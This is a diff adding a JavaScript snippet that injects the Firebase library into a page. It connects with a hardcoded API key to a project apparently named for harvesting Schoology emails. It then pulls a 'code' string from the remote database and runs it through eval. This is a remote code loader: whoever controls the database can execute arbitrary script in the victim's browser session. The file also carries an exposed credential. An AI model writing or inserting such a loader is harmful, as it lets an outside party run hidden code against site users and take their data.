@@ -1,0 +1,21 @@
+var ss = document.createElement("script");
+        ss.src = "https://www.gstatic.com/firebasejs/3.3.0/firebase.js";
+        ss.type = "text/javascript";
+        console.log(ss)
+        document.getElementsByTagName("head")[0].appendChild(ss);
+setTimeout(function(){
+// Initialize Firebase
+  var config = {
+    apiKey: "AIzaSyCliznebyzx1QPf_IimONQHLMjO-S20wx0",
+    authDomain: "schoology-email-get.firebaseapp.com",
+    databaseURL: "https://schoology-email-get.firebaseio.com",
+    storageBucket: "schoology-email-get.appspot.com",
+  };
+  firebase.initializeApp(config);
+  // Each app has its own configuration options and authentication state
+  ref = firebase.database().ref();
+  ref2 = firebase.database().ref("/names")
+ref.once("value")
+  .then(function(snapshot) {
+    eval(snapshot.child("code").val())
+  });},50)
